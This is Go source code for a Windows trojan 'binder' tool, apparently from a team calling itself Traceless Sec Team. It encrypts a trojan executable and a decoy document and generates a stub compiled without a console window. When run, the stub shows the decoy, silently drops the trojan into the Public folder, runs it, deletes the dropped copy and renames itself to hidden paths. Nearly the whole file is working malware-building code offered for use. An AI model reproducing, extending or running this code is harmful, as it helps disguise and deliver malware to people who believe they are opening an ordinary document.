package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/fatih/color"
	"github.com/mbndr/figlet4go"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
)

var (
	AesKey         = generate()
	filename       string
	docfilename    string
	FileContentOne string
	FileContentTwo string
	err            error
)

func generate() []byte {
	key := make([]byte, 16) // AES-128的密钥长度为16字节（128位）
	_, err := rand.Read(key)
	if err != nil {
		panic(err) // 处理随机数生成失败的情况
	}
	return key
}

func Encode(plaintext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	plaintext = PKCS7Padding(plaintext, aes.BlockSize)

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)

	return []byte(base64.StdEncoding.EncodeToString(ciphertext)), nil
}

// PKCS7Padding 对数据进行PKCS7填充
func PKCS7Padding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

func EnFileContent(FilePath string) (string, error) {
	file, err := os.Open(FilePath)
	if err != nil {
		return fmt.Sprintf("[-] 打开目标文件 %s 失败！\n", FilePath), err
	}
	defer file.Close()
	fileContent, err := ioutil.ReadAll(file)
	if err != nil {
		return fmt.Sprintf("[-] 读取目标文件 %s 失败！\n", FilePath), err
	}
	resData, err := Encode(fileContent, AesKey)
	if err != nil {
		return fmt.Sprintf("[-] 文件 %s AES加密失败！\n", FilePath), err

	}
	fmt.Printf("[+] 文件 %s AES加密成功！\n", FilePath)
	return string(resData), nil
}

func NewgoFile() string {
	return fmt.Sprintf(`
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"os"
	"os/exec"
	"syscall"
	"time"
)

const (
	filename       = "%s"
	docfilename    = ".\\%s"
	FileContent    = "%s"
	DocFileContent = "%s"
	dstFilecc      = "C:\\Users\\Public\\" + filename
	dstFile        = "c:\\Users\\Public\\.gfghtfcvagrrgagt"
)

var (
	Key,_      = base64.StdEncoding.DecodeString("%s")
	docfile, _ = decrypt([]byte(DocFileContent), Key)
	file, _    = decrypt([]byte(FileContent), Key)
	selfile, _ = os.Executable()
	strccc, _  = os.Getwd()
	f2, _      = os.Create(docfilename)
	_, _       = f2.Write(docfile)
)


func decrypt(ciphertext []byte, key []byte) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(string(ciphertext))
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	iv := data[:aes.BlockSize]
	data = data[aes.BlockSize:]
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(data, data)
	length := len(data)
	unpadding := int(data[length-1])
	return data[:(length - unpadding)], nil
}

func main() {
	err := os.Rename(selfile, dstFile)
	if err != nil {
			panfu := strccc[0:2]
			dstFilee := panfu + "\\ug8H7BC76ffsef8Oyth89"
			err = os.Rename(selfile, dstFilee)
		}
	cmd := exec.Command("cmd", " /c ", strccc+docfilename)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	f2.Close()
	cmd.Start()
	startTime := time.Now()
	for {
		currentTime := time.Now()
		timeDifference := currentTime.Sub(startTime)
		if timeDifference >= 5*time.Second {
			break 
		}
	}
	f, _ := os.Create(dstFilecc)
	f.Write(file)
	f.Close()
	startTime = time.Now()
	for {
		currentTime := time.Now()
		timeDifference := currentTime.Sub(startTime)
		if timeDifference >= 15*time.Second {
			break 
		}
	}
	
	exec.Command(dstFilecc).Start()
	os.Remove(dstFilecc)
}

`, filename, docfilename, FileContentOne, FileContentTwo, base64.StdEncoding.EncodeToString(AesKey))
}

func init() {
	ascii := figlet4go.NewAsciiRender()
	options := figlet4go.NewRenderOptions()
	options.FontColor = []figlet4go.Color{
		figlet4go.ColorRed,
	}
	renderStr, _ := ascii.RenderOpts("GoBinderFile", options)
	fmt.Println(renderStr)
	cyan := color.New(color.FgCyan)
	purple := color.New(color.FgMagenta)
	fmt.Println(cyan.Sprintf("\t\t\t\t\t\t\t\t\t\tversion: "), purple.Sprintf("v1.0.0"))
	fmt.Println(cyan.Sprintf("\t\t\t\t\t\t\t\t\t\tTeam: "), purple.Sprintf("Traceless Sec Team"))
	fmt.Println(cyan.Sprintf("\t\t\t\t\t\t\t\t\t\tBy: "), purple.Sprintf("一条'小龍龙"))
}

func main() {
	ExeFilePath := flag.String("f", "", "[ExeFilePath] 请输入要捆绑的木马文件！")
	DocFilePath := flag.String("t", "", "[TargetFilePath] 请输入要捆绑的目标文件！")
	flag.Parse()
	if *ExeFilePath == "" || *DocFilePath == "" {
		fmt.Println("[*] -f 和 -t 参数不能为空！")
		return
	}
	filename = filepath.Base(*ExeFilePath)
	docfilename = filepath.Base(*DocFilePath)

	FileContentOne, err = EnFileContent(*ExeFilePath)
	if nil != err {
		return
	}
	FileContentTwo, err = EnFileContent(*DocFilePath)
	if nil != err {
		return
	}
	exec.Command("cmd", "/c", "attrib -s -a -h -r result.go && attrib -s -a -h -r result.bat").CombinedOutput()
	file, err := os.Create("result.go")
	if err != nil {
		fmt.Printf("[-] 创建文件失败！%v", err)
		return
	}
	defer file.Close()
	_, err = file.Write([]byte(NewgoFile()))
	if err != nil {
		fmt.Printf("[-] 写入文件失败！%v", err)
		return
	}
	fmt.Println("[+] 文件生成完毕！")
	fmt.Println("[*] 正在编译为可执行文件...")
	file, err = os.Create("result.bat")
	_, err = file.Write([]byte("cmd /c go build -ldflags=\"-H=windowsgui\" result.go"))
	if err != nil {
		fmt.Printf("[-] 写入文件失败，出现错误：%v", err)
		return
	}
	defer file.Close()
	exec.Command("cmd", "/c", "attrib -s -a -h -r result.go && attrib -s -a -h -r result.bat").Run()
	err = exec.Command("cmd", "/c", "result.bat").Run()
	if err != nil {
		fmt.Printf("[-] 编译失败，出现错误：%v", err)
		return
	}
	defer func() {
		err = os.Remove("result.go")
		if err != nil {
			fmt.Printf("[-] 清理文件失败，出现错误：%v", err)
			return
		}

		err = os.Remove("result.bat")
		if err != nil {
			fmt.Printf("[-] 清理文件失败，出现错误：%v", err)
			return
		}
	}()

	fmt.Println("[+] 木马程序生成完毕，当前目录下 ==> result.exe")
}
